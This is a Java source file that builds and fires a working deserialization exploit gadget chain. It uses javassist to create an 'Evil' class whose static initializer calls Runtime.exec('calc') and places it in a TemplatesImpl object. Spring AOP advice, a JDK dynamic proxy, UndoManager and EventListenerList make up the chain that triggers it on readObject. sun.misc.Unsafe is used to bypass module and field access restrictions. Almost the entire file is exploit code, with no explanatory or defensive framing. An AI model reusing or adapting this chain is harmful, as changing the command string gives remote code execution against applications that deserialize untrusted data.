package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.aop.Advisor;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.DefaultAdvisorChainFactory;
import org.springframework.aop.interceptor.ExposeInvocationInterceptor;
import org.springframework.aop.support.NameMatchMethodPointcutAdvisor;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.aop.target.SingletonTargetSource;
import sun.misc.Unsafe;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.Module;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Vector;

public class Main {

    public static void main(String[] args) throws Exception {
        patchModule(Main.class);


        Object templates = createTemplatesImplByUnsafe("calc");
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);

        AspectJAroundAdvice advice = (AspectJAroundAdvice) allocateInstance(AspectJAroundAdvice.class);
        setField(advice, "aspectInstanceFactory", factory);
        setField(advice, "declaringClass", Templates.class);
        setField(advice, "methodName", "getOutputProperties");
        setField(advice, "parameterTypes", new Class[0]);

        AspectJExpressionPointcut pointcut = (AspectJExpressionPointcut) allocateInstance(AspectJExpressionPointcut.class);
        setField(advice, "pointcut", pointcut);
        setIntField(advice, "joinPointArgumentIndex", -1);
        setIntField(advice, "joinPointStaticPartArgumentIndex", -1);

//        NameMatchMethodPointcutAdvisor advisor = new NameMatchMethodPointcutAdvisor(advice);
//        advisor.setMappedName("toString1");
//        List<Advisor> advisors = new ArrayList<>();
//        advisors.add(advisor);

        Class<?> jdkDynamicProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> proxyConstructor = jdkDynamicProxyClass.getDeclaredConstructor(AdvisedSupport.class);
        proxyConstructor.setAccessible(true);
        Constructor<?> c = ExposeInvocationInterceptor.class.getDeclaredConstructors()[0];
        c.setAccessible(true);
        ExposeInvocationInterceptor interceptor = (ExposeInvocationInterceptor) c.newInstance();
        AdvisedSupport advisedSupport = new AdvisedSupport();
        //advisedSupport.setTargetSource(new HotSwappableTargetSource("target"));

//        setField(advisedSupport, "advisors", advisors);
//        setField(advisedSupport, "advisorChainFactory", new DefaultAdvisorChainFactory());
        advisedSupport.addAdvice(interceptor);
        advisedSupport.addAdvice(advice);

        InvocationHandler handler = (InvocationHandler) proxyConstructor.newInstance(advisedSupport);

        Object proxy = Proxy.newProxyInstance(
                Main.class.getClassLoader(),
                new Class[]{Map.class},
                handler
        );

        EventListenerList listenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector edits = (Vector) getField(undoManager, "edits");
        edits.add(proxy);
        setField(listenerList, "listenerList", new Object[]{Class.class, undoManager});


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(listenerList);
        oos.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(barr.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        //new Throwable().printStackTrace();
    }

    public static Unsafe getUnsafe() {
        try {
            Field f = Unsafe.class.getDeclaredField("theUnsafe");
            f.setAccessible(true);
            return (Unsafe) f.get(null);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static Object allocateInstance(Class<?> clazz) {
        try {
            return getUnsafe().allocateInstance(clazz);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        }
    }

    public static void setField(Object obj, String fieldName, Object value) {
        try {
            Field field = null;
            Class<?> clazz = obj.getClass();
            while (clazz != null) {
                try {
                    field = clazz.getDeclaredField(fieldName);
                    break;
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (field == null) throw new NoSuchFieldException(fieldName);

            Unsafe unsafe = getUnsafe();
            long offset = unsafe.objectFieldOffset(field);
            unsafe.putObject(obj, offset, value);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static void setIntField(Object obj, String fieldName, int value) {
        try {
            Field field = null;
            Class<?> clazz = obj.getClass();
            while (clazz != null) {
                try {
                    field = clazz.getDeclaredField(fieldName);
                    break;
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (field == null) throw new NoSuchFieldException(fieldName);

            Unsafe unsafe = getUnsafe();
            long offset = unsafe.objectFieldOffset(field);
            unsafe.putInt(obj, offset, value);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static Object getField(Object obj, String fieldName) {
        try {
            Field field = null;
            Class<?> clazz = obj.getClass();
            while (clazz != null) {
                try {
                    field = clazz.getDeclaredField(fieldName);
                    break;
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (field == null) throw new NoSuchFieldException(fieldName);

            Unsafe unsafe = getUnsafe();
            long offset = unsafe.objectFieldOffset(field);
            return unsafe.getObject(obj, offset);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static Object createTemplatesImplByUnsafe(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass evilClass = pool.makeClass("Evil" + System.nanoTime());
        evilClass.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + cmd + "\");");

        byte[] evilBytes = evilClass.toBytecode();
        CtClass stubClass = pool.makeClass("Stub" + System.nanoTime());
        byte[] stubBytes = stubClass.toBytecode();

        Object templates = allocateInstance(TemplatesImpl.class);

        setField(templates, "_bytecodes", new byte[][]{evilBytes, stubBytes});
        setField(templates, "_name", "Pwnd");
        setIntField(templates, "_transletIndex", 0);

        return templates;
    }

    public static void patchModule(Class<?> clazz) {
        try {
            Unsafe unsafe = getUnsafe();
            Module javaBaseModule = Object.class.getModule();
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.putObject(clazz, offset, javaBaseModule);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
//--add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED
